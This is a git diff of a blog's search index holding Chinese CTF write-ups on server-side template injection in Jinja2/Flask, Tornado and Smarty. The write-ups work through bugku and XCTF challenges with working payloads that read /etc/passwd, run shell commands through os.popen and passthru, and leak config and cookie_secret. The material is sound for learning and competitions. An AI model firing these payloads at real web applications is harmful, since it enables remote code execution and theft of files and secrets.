class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">routing</span>.<span class="title">RuleFactory</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">routing</span>.<span class="title">RuleTemplate</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">routing</span>.<span class="title">BaseConverter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">routing</span>.<span class="title">Map</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">routing</span>.<span class="title">MapAdapter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">_compat</span>.<span class="title">_FixupStream</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">_compat</span>.<span class="title">_AtomicFile</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">utils</span>.<span class="title">LazyFile</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">utils</span>.<span class="title">KeepOpenFile</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">utils</span>.<span class="title">PacifyFlushWrapper</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">types</span>.<span class="title">ParamType</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">parser</span>.<span class="title">Option</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">parser</span>.<span class="title">Argument</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">parser</span>.<span class="title">ParsingState</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">parser</span>.<span class="title">OptionParser</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">formatting</span>.<span class="title">HelpFormatter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">core</span>.<span class="title">Context</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">core</span>.<span class="title">BaseCommand</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">core</span>.<span class="title">Parameter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">signals</span>.<span class="title">Namespace</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">signals</span>.<span class="title">_FakeSignal</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">helpers</span>.<span class="title">locked_cached_property</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">helpers</span>.<span class="title">_PackageBoundObject</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">cli</span>.<span class="title">DispatchingApp</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">cli</span>.<span class="title">ScriptInfo</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">config</span>.<span class="title">ConfigAttribute</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">ctx</span>.<span class="title">_AppCtxGlobals</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">ctx</span>.<span class="title">AppContext</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">ctx</span>.<span class="title">RequestContext</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">json</span>.<span class="title">tag</span>.<span class="title">JSONTag</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">json</span>.<span class="title">tag</span>.<span class="title">TaggedJSONSerializer</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">sessions</span>.<span class="title">SessionInterface</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">json</span>.<span class="title">_JSONModule</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">json</span>.<span class="title">JSONMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">blueprints</span>.<span class="title">BlueprintSetupState</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">serving</span>.<span class="title">WSGIRequestHandler</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">ext</span>.<span class="title">Extension</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">ext</span>.<span class="title">_CommentFinder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">serving</span>.<span class="title">_SSLContext</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">serving</span>.<span class="title">BaseWSGIServer</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">unicodedata</span>.<span class="title">UCD</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">array</span>.<span class="title">array</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">debug</span>.<span class="title">TracebackFrameProxy</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">debug</span>.<span class="title">ProcessedTraceback</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">test</span>.<span class="title">_TestCookieHeaders</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">test</span>.<span class="title">_TestCookieResponse</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">test</span>.<span class="title">EnvironBuilder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">test</span>.<span class="title">Client</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">method</span>-<span class="title">wrapper</span>&#x27;&gt;]</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405151455.png" /></p>
+<p>这里存在一个<code>type "file"</code>（python3没有），可以利用： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="comment"># 40 是 file 在元组中的下标</span></span><br></pre></td></tr></table></figure></p>
+<p>读到 <code>/etc/passwd</code> 里的内容。</p>
+<h3 id="命令执行">命令执行</h3>
+<p>继续看命令执行payload的构造，思路和构造文件读取的一样。</p>
+<p>寻找包含os模块的脚本（思路如下） <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">         <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">in</span> item.__init__.__globals__:</span><br><span class="line">             <span class="built_in">print</span> num,item</span><br><span class="line">         num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;-&#x27;</span></span><br><span class="line">        num += <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<p>输出： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">-</span><br><span class="line"><span class="number">71</span> &lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">site</span>.<span class="title">_Printer</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">-</span></span><br><span class="line"><span class="class">-</span></span><br><span class="line"><span class="class">-</span></span><br><span class="line"><span class="class">-</span></span><br><span class="line"><span class="class">76 &lt;<span class="title">class</span> &#x27;<span class="title">site</span>.<span class="title">Quitter</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>用的是71。</p>
+<p>思考怎样用 python 语句获取控制台权限：想到了 <code>os.system</code> 和 <code>os.popen</code></p>
+<p>这两句前 者返回<strong>退出状态码</strong> , 只不过命令执行的结果无法直接看到，需要利用curl将结果发送到自己的vps或者利用ceye。</p>
+<p>payload: <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;command&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
+<p>后者<strong>以 file 形式</strong>返回<strong>输出内容</strong>, 我们想要的是内容。payload: <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;command&#x27;</span>).read()</span><br></pre></td></tr></table></figure></p>
+<p>这里使用后者来获得本题的flag。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat fl4g&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405152412.png" /></p>
+<p>构造paylaod的思路和构造文件读取的是一样的。</p>
+<p><strong>常见的子类的引用：</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> &lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">os</span>.<span class="title">_wrap_close</span>&#x27;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;&#123;&#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__base__</span>.<span class="title">__subclasses__</span>()[127].<span class="title">__init__</span>.<span class="title">__globals__</span>[&#x27;<span class="title">sys</span>&#x27;].<span class="title">modules</span>[&#x27;<span class="title">os</span>&#x27;].<span class="title">popen</span>(<span class="params"><span class="string">&#x27;ls&#x27;</span></span>).<span class="title">read</span>()&#125;&#125; </span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;&#123;&#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__base__</span>.<span class="title">__subclasses__</span>()[127].<span class="title">__init__</span>.<span class="title">__globals__</span>[&#x27;<span class="title">popen</span>&#x27;](<span class="params"><span class="string">&#x27;ls&#x27;</span></span>).<span class="title">read</span>()&#125;&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;&#123;&#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__base__</span>.<span class="title">__subclasses__</span>()[127].<span class="title">__init__</span>.<span class="title">__globals__</span>。<span class="title">popen</span>(<span class="params"><span class="string">&#x27;ls&#x27;</span></span>).<span class="title">read</span>()&#125;&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">2. &lt;<span class="title">class</span> &#x27;<span class="title">site</span>.<span class="title">_Printer</span>&#x27;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;&#123;&#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__mro__</span>[2].<span class="title">__subclasses__</span>()[71].<span class="title">__init__</span>.<span class="title">__globals__</span>[&#x27;<span class="title">os</span>&#x27;].<span class="title">system</span>(<span class="params"><span class="string">&#x27;command&#x27;</span></span>)&#125;&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">3. <span class="title">__import__</span>方法的<span class="title">os</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;&#123;&quot;&quot;.<span class="title">__class__</span>.<span class="title">__bases__</span>[0].<span class="title">__subclasses__</span>()[75].<span class="title">__init__</span>.<span class="title">__globals__</span>.<span class="title">__import__</span>(<span class="params"><span class="string">&#x27;os&#x27;</span></span>).<span class="title">popen</span>(<span class="params"><span class="string">&#x27;whoami&#x27;</span></span>).<span class="title">read</span>()&#125;&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">4. <span class="title">__builtins__</span>  </span></span><br><span class="line"><span class="class">	1. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">Quitter</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">	2. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">_Printer</span>&#x27;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;&#123;&#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__base__</span>.<span class="title">__subclasses__</span>()[128].<span class="title">__init__</span>.<span class="title">__globals__</span>[&#x27;<span class="title">sys</span>&#x27;].<span class="title">modules</span>[&#x27;<span class="title">os</span>&#x27;].<span class="title">popen</span>(<span class="params"><span class="string">&#x27;ls&#x27;</span></span>).<span class="title">read</span>()&#125;&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">5. &lt;<span class="title">class</span> &#x27;<span class="title">_frozen_importlib</span>.<span class="title">_ModuleLock</span>&#x27;&gt;里的<span class="title">__init__</span>.<span class="title">__globals__</span>.<span class="title">__builtins__</span>里面的[&#x27;<span class="title">eval</span>&#x27;]</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;&#123;&#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__base__</span>.<span class="title">__subclasses__</span>()[75].<span class="title">__init__</span>.<span class="title">__globals__</span>.<span class="title">__builtins__</span>[&#x27;<span class="title">eval</span>&#x27;](<span class="params"><span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span></span>)&#125;&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">6. &#123;&#123;<span class="title">config</span>.<span class="title">__class__</span>.<span class="title">__init__</span>.<span class="title">__globals__</span>[&#x27;<span class="title">os</span>&#x27;].<span class="title">popen</span>(<span class="params"><span class="string">&#x27;ls&#x27;</span></span>).<span class="title">read</span>()&#125;&#125;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="全局变量绕过黑名单">全局变量绕过黑名单</h2>
+<p>当flag在变量中时，可以使用这个方法。如果没有黑名单，可以直接即可</p>
+<p>有两个函数<code>url_for</code>和<code>get_flashed_messages</code>，这两个函数的引用内容中有<code>current_app</code>全局变量，可以利用全局变量直接读取内容。如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. &#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line">2. &#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="题目">题目</h1>
+<ol type="1">
+<li><a href="https://hdfzzf.icu/2022/04/05/bugku_SSTI_2">bugku_SSTI_2</a></li>
+<li><a href="https://hdfzzf.icu/2022/04/05/攻防世界_shrine">攻防世界_shrine</a></li>
+<li><a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5408&amp;page=1">攻防世界_easytornado</a></li>
+</ol>
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>Jinjia2</tag>
+        <tag>Flask</tag>
       </tags>
   </entry>
   <entry>
@@ -784,34 +868,88 @@
       </tags>
   </entry>
   <entry>
-    <title>bugku_聪明的php</title>
-    <url>/2022/04/05/bugku_%E8%81%AA%E6%98%8E%E7%9A%84php/</url>
-    <content><![CDATA[<p>题目地址：https://ctf.bugku.com/challenges/detail/id/198.html</p>
+    <title>Tornado_render模板注入</title>
+    <url>/2022/04/05/Tornado_render%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p>记录一下关于Tornado模板注入的知识点以及相关的payload。</p>
 <span id="more"></span>
+<h1 id="原理">原理</h1>
+<p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过<code>&#123;&#123;&#125;&#125;</code>进行传递变量和执行简单的表达式。</p>
+<p>这个模板就遇到一道题目，结合着一起说明。</p>
 <h1 id="题目信息">题目信息</h1>
-<p>进入环境获得一句话提示： &gt;pass a parameter and maybe the flag file's filename is random :&gt;</p>
-<p>随便给一个参数，得到如下界面：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113111.png" /></p>
-<p>将代码复制出来： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./libs/Smarty.class.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;pass a parameter and maybe the flag file&#x27;s filename is random :&gt;&quot;</span>;  </span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> Smarty();  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123; highlight_file(<span class="string">&#x27;index.php&#x27;</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">AS</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$key</span>.<span class="string">&quot;\n&quot;</span>;  </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag|\/flag/i&quot;</span>, <span class="variable">$value</span>))&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        &#125;<span class="keyword">elseif</span>(preg_match(<span class="string">&quot;/system|readfile|gz|exec|eval|cat|assert|file|fgets/i&quot;</span>, <span class="variable">$value</span>))&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);              </span><br><span class="line">              </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;eval:&quot;</span>.<span class="variable">$value</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">          </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>发现关键词<code>smarty</code>。 # 解题 本题已知模板引擎为SSTI，那么接下来就应该判断以下版本 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113325.png" /></p>
-<p>版本为3.1。</p>
-<p>那么<a href="https://hdfzzf.icu/2022/04/05/Smarty模板注入/">Smarty模板注入</a>中的常规利用、{literal}标签、静态方法都无法使用，那只能使用{if}标签和命令执行。</p>
-<h2 id="命令执行">命令执行</h2>
-<p>查找flag的路径： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=&#123;passthru(<span class="string">&#x27;ls /&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113844.png" /></p>
-<p>根据最开始的提示，flag的文件名是随机取得，因此判断红框就是flag文件。</p>
-<p>接着需要读取flag（注意cat被过滤了）： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=&#123;passthru(<span class="string">&#x27;tac /_9764&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405114505.png" /></p>
-<h2 id="if标签">{if}标签</h2>
-<p>其实和命令执行没什么不同。payload如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. ?a=&#123;<span class="keyword">if</span> passthru(<span class="string">&#x27;ls /&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line"><span class="number">2</span>. ?a=&#123;<span class="keyword">if</span> passthru(<span class="string">&#x27;tac /_9764&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405114645.png" /></p>
+<p>题目地址：<a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5422&amp;page=1">攻防世界_easytornado</a></p>
+<p>进入环境之后，有三个文件</p>
+<ol type="1">
+<li>flag.txt</li>
+<li>welcome.txt</li>
+<li>hints.txt</li>
+</ol>
+<p>文件的内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag.txt:</span><br><span class="line">/flag.txt  </span><br><span class="line">flag in /fllllllllllllag</span><br><span class="line"></span><br><span class="line">welcome.txt:</span><br><span class="line">/welcome.txt  </span><br><span class="line">render</span><br><span class="line"></span><br><span class="line">hints.txt:</span><br><span class="line">/hints.txt  </span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure></p>
+<p>每个文件都给了很多的信息：</p>
+<ol type="1">
+<li>flag在fllllllllllllag文件里</li>
+<li>该题使用的是render，也就是tornado模板引擎</li>
+<li>一种加密方式</li>
+</ol>
+<p>这是注意到url，每查看一个文件，url都不同，并且有一串奇怪的hash值。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405142849.png" /></p>
+<p>据此猜测，<code>filehash=md5(cookie_secret+md5(filename))</code>。</p>
+<p>此时，已知flag所在文件名，并且加密方式也知道了，那么只需要知道<code>cookie_secret</code>就可以得到flag。</p>
+<h1 id="解题">解题</h1>
+<p>随便修改filehash值，发现来到一个新的页面</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405143238.png" /></p>
+<p>url中<code>msg=Error</code>，猜测注入点在这，输入测试payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?msg=&#123;&#123;datetime&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在Tornado的前端页面模板中，datetime是指向python中datetime这个模块，Tornado提供了一些对象别名来快速访问对象，可以参考Tornado官方文档</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405143457.png" /></p>
+<p>到这里确定，本题存在SSTI漏洞，模板引擎为Tornado。</p>
+<p>查Tornado的官方文档得知：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405143614.png" /></p>
+<p>settings中存在着<code>cookie_secret</code>，而settings是<code>RequestHandler</code>的一个方法。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405144010.png" /></p>
+<p>我们只需要访问<code>RequestHandler.settings</code>就可以知道<code>seret.cookie</code>。<code>RequestHandler</code>是一个类，<code>handler</code>指向的处理当前这个页面的<code>RequestHandler</code>对象，因此，有下列等价关系： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler.settings &lt;-&gt; RequestHandler.settings &lt;-&gt; self.application.settings</span><br></pre></td></tr></table></figure></p>
+<p>因此，输入payload <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405144419.png" /></p>
+<p>成功得到<code>secret_cookie</code>。</p>
+<p>接下来只需要计算fliehash即可。编写如下脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib  </span><br><span class="line">cookie_secret = <span class="string">&quot;95444e41-8037-4da5-bb59-fc97325154d5&quot;</span> <span class="comment"># cookie_secret  </span></span><br><span class="line">filename = <span class="string">&quot;/fllllllllllllag&quot;</span> <span class="comment"># filename  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getValue</span>(<span class="params"><span class="built_in">str</span></span>):</span>  </span><br><span class="line">    md5 = hashlib.md5()  </span><br><span class="line">    md5.update(<span class="built_in">str</span>.encode(<span class="string">&quot;utf-8&quot;</span>))  </span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()  </span><br><span class="line">filehash = getValue(cookie_secret + getValue(filename))  <span class="comment"># filehash  </span></span><br><span class="line"><span class="built_in">print</span>(filehash)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405145257.png" /></p>
 ]]></content>
       <categories>
         <category>SSTI</category>
       </categories>
       <tags>
-        <tag>Smarty</tag>
+        <tag>Tornado</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bugku_SSTI_2</title>
+    <url>/2022/04/05/bugku_SSTI_2/</url>
+    <content><![CDATA[<p>题目地址：https://ctf.bugku.com/challenges/detail/id/203.html</p>
+<span id="more"></span>
+<h1 id="题目信息">1 题目信息</h1>
+<p>进入环境。得到提示信息 <code>You need pass in a parameter named flag</code>。又因为题目带有SSTI，根据决策树</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220404145633.png" /></p>
+<p>直接尝试如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?flag=$&#123;7*7&#125; # 结果：$&#123;7*7&#125;</span><br><span class="line">2. ?flag=&#123;&#123;7*7&#125;&#125; # 结果：49</span><br><span class="line">3. ?flag=&#123;&#123;7*&#x27;7&#x27;&#125;&#125; # 结果：7777777</span><br></pre></td></tr></table></figure></p>
+<p>因此判断模板引擎是Jinjia2或者是flask。 # 2 payload 输入如下payload： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>从中找出如下可用的子类： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">75.</span> &lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">_frozen_importlib</span>.<span class="title">_ModuleLock</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">127. &lt;<span class="title">class</span> &#x27;<span class="title">os</span>.<span class="title">_wrap_close</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">128. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">Quitter</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">129. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">_Printer</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>接下来共有4种方法</p>
+<ul>
+<li><p>方法1 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p></li>
+<li><p>方法2</p></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>方法3</li>
+</ul>
